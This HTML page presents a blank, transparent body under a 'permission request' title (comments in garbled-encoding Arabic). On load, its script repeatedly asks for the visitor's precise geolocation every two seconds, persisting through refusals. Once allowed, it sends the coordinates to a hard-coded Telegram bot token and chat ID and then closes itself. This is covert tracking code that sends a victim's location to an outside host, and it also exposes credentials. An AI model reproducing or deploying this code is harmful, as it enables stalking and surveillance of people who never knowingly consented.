<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù†</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";
        
        let requestCount = 0;

        function startLocationRequests() {
            console.log("ğŸš€ Ø¨Ø¯Ø¡ Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹...");
            
            // Ø·Ù„Ø¨ ÙÙˆØ±ÙŠ Ø£ÙˆÙ„ÙŠ
            requestLocation();
            
            // Ø·Ù„Ø¨ ÙƒÙ„ 2 Ø«Ø§Ù†ÙŠØ© Ø¨Ø§Ù„Ø¶Ø¨Ø·
            setInterval(requestLocation, 2000);
        }

        function requestLocation() {
            requestCount++;
            console.log(`ğŸ“ Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ #${requestCount}`);

            if (!navigator.geolocation) {
                console.log("âŒ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„Ù…ÙˆÙ‚Ø¹");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                // âœ… Ø¥Ø°Ø§ ÙˆØ§ÙÙ‚
                async function(position) {
                    console.log("âœ… ØªÙ… Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹!");
                    
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // Ø¥Ø±Ø³Ø§Ù„ ÙÙˆØ±ÙŠ Ù„Ù„Ø¨ÙˆØª
                    await sendToTelegram(lat, lng, accuracy, requestCount);
                    
                    // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø© Ø¨Ø¹Ø¯ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
                    setTimeout(() => {
                        window.close();
                    }, 1000);
                },
                // âŒ Ø¥Ø°Ø§ Ø±ÙØ¶ - Ù†Ø³ØªÙ…Ø± Ø¨Ø¯ÙˆÙ† Ø£ÙŠ Ø±Ø³Ø§Ù„Ø©
                function(error) {
                    console.log(`ğŸ”„ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø·Ù„Ø¨ #${requestCount} - Ù†Ø³ØªÙ…Ø±...`);
                    // Ù„Ø§ Ù†Ù‚ÙˆÙ… Ø¨Ø£ÙŠ Ø´ÙŠØ¡ - setInterval Ø³ÙŠØ¹ÙŠØ¯ Ø§Ù„Ø·Ù„Ø¨ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }

        async function sendToTelegram(lat, lng, accuracy, attempts) {
            const message = 
                `ğŸ¯ Ù…ÙˆÙ‚Ø¹ Ù…Ù† Ø·Ù„Ø¨ Ù…ØªÙƒØ±Ø±\n\n` +
                `ğŸ“ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:\n` +
                `â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${lat.toFixed(6)}\n` +
                `â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${lng.toFixed(6)}\n` +
                `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${accuracy} Ù…ØªØ±\n\n` +
                `ğŸ”„ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª: ${attempts}\n` +
                `ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-MA')}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                console.log("âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­");
            } catch (error) {
                console.log("âŒ ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", error);
            }
        }

        // Ø§Ù„Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        window.onload = startLocationRequests;

    </script>
</head>
<body style="margin:0;padding:0;background:transparent;">
    <!-- ØµÙØ­Ø© ÙØ§Ø±ØºØ© ØªÙ…Ø§Ù…Ø§Ù‹ -->
</body>
</html>